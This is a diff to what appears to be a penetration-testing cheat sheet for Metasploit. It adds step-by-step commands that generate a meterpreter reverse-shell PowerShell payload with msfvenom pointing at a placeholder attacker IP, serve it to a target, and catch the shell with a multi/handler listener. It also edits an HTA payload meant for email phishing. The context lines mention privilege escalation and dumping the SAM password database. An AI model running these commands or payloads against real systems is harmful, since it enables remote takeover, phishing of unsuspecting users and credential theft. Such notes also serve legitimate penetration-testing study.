@@ -126,12 +126,24 @@ getsystem: Attempts to elevate your privilege to that of local system
 hashdump: Dumps the contents of the SAM database
 ```
 
+### Example of shells
+
+#### Using powershell
+
+- Generate the script with `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACK-MACHINE-IP LPORT=PORT -f psh -o shell.ps1`
+- Serve it to the target with `python3 -m http.server port`
+- Set up your listener on msfconsole `use multi/handler` `set payload windows/x64/meterpreter/reverse_tcp` set also LHOST and LPORT
+- `exploit -j`
+- run the exploit on the target you should have a shell
+- list your sessions with `sessions`
+- Interact with the desired session using `sessions -i number-of-session`
+
 ## HTA Email Phishing
 
 ### Create the payload with msfvenom
 
 ```
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP-OF-ATTACK-MACHINE LPORT=443 -f hta-psh -o Benefit.hta
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP-OF-ATTACK-MACHINE LPORT=443 -f hta-psh -o payload.hta
 ```
 
 ### Set up metasploit
